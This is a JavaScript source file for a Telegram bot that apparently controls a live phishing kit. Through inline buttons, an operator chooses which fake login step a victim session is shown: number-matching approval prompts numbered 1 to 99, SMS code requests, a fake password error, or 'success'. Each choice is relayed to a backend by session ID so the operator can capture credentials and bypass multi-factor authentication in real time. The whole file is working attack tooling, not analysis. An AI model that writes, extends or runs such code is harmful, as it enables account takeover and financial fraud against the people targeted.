import "dotenv/config";
import TelegramBot from "node-telegram-bot-api";
import { saveChatId, loadChatId } from "./sessionStore.js";

const token = process.env.TELEGRAM_TOKEN;
const API_URL = process.env.WEBHOOK_URL || "http://127.0.0.1:3000";

const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { 
  webHook: false 
});

let connectedChatId = null;
let activeSessionId = null;

(async () => {
  connectedChatId = await loadChatId();
})();

bot.onText(/\/start/, async (message) => {
  connectedChatId = message.chat.id;
  await saveChatId(connectedChatId);

  bot.sendMessage(
    message.chat.id,
    "🤖 Your Telegram Bot is Connected and Listening",
  );
});

export const getConnectedChatId = () => connectedChatId;

function getSecurityPreferenceMarkup() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✅ Yes Prompt",
            callback_data: "yes_prompt",
          },
          {
            text: "📱 SMS Code",
            callback_data: "sms_code",
          },
        ],
        [
          {
            text: "📞 Number Prompt",
            callback_data: "number_prompt",
          },
          {
            text: "❌ Password Error",
            callback_data: "password_error",
          },
        ],
        [
          {
            text: "✅ Success",
            callback_data: "success",
          },
        ],
      ],
    },
  };
}

export function sendSecurityPreference(sessionId, variant = "normal") {
  if (!connectedChatId) {
    throw new Error("No Telegram chat is connected.");
  }

  activeSessionId = sessionId;

  const messages = {
    normal: "🔒 Security Preference",
    resend: "🔄🔒 Resent Yes Prompt",
    tryAnotherWay: "🆕🔒 Try Another Way Security Preference",
    phoneNumber: "📱🔒 SMS Code Prompt",
  };

  const message = messages[variant] ?? messages.normal;

  return bot.sendMessage(
    connectedChatId,
    message,
    getSecurityPreferenceMarkup(),
  );
}

console.log("Telegram bot is running 🚀");

bot.on("callback_query", async (callbackQuery) => {
  bot.answerCallbackQuery(callbackQuery.id);

  const { data, message } = callbackQuery;

  if (data === "yes_prompt") {
    const buttons = [];
    const buttonsPerRow = 8;

    for (let i = 1; i <= 99; i += buttonsPerRow) {
      const row = [];

      for (let j = i; j < i + buttonsPerRow && j <= 99; j++) {
        row.push({
          text: String(j),
          callback_data: `yes_prompt:${j}`,
        });
      }

      buttons.push(row);
    }

    bot.sendMessage(message.chat.id, "Choose the number:", {
      reply_markup: {
        inline_keyboard: buttons,
      },
    });
    return;
  }

  if (data === "sms_code") {
    try {
      const response = await fetch(`${API_URL}/api/telegram/action`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: activeSessionId,
          action: "sms_code",
        }),
      });

      if (!response.ok) {
        throw new Error(`Backend responded with ${response.status}`);
      }

      bot.sendMessage(message.chat.id, "SMS Code Selected ✅");
    } catch (error) {
      console.error("Failed to send Telegram action:", error);
    }

    return;
  }

  if (data === "success") {
    try {
      const response = await fetch(`${API_URL}/api/telegram/action`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: activeSessionId,
          action: "success",
        }),
      });

      if (!response.ok) {
        throw new Error(`Backend responded with ${response.status}`);
      }

      await bot.sendMessage(message.chat.id, "You're in Chief 🫡✅");
    } catch (error) {
      console.error("Failed to send Telegram success action:", error);
    }

    return;
  }

  if (data === "number_prompt") {
    try {
      const response = await fetch(`${API_URL}/api/telegram/action`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: activeSessionId,
          action: "number_prompt",
        }),
      });

      if (!response.ok) {
        throw new Error(`Backend responded with ${response.status}`);
      }

      await bot.sendMessage(message.chat.id, "Number Prompt selected ✅");
    } catch (error) {
      console.error("Failed to send Telegram number prompt action:", error);
    }

    return;
  }

  if (data === "password_error") {
    try {
      const response = await fetch(`${API_URL}/api/telegram/action`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: activeSessionId,
          action: "password_error",
        }),
      });

      if (!response.ok) {
        throw new Error(`Backend responded with ${response.status}`);
      }

      await bot.sendMessage(message.chat.id, "Password error selected ✅");
    } catch (error) {
      console.error("Failed to send Telegram password error action:", error);
    }

    return;
  }

  if (data.startsWith("yes_prompt:")) {
    const number = data.split(":")[1];

    try {
      const response = await fetch(`${API_URL}/api/telegram/selection`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId: activeSessionId,
          number,
        }),
      });

      if (!response.ok) {
        throw new Error(`Backend responded with ${response.status}`);
      }

      bot.sendMessage(message.chat.id, `You selected ${number} ✅`);
    } catch (error) {
      console.error("Failed to send Telegram selection:", error);

      bot.sendMessage(
        message.chat.id,
        "Something went wrong sending the selection.",
      );
    }
  }
});

export { bot };
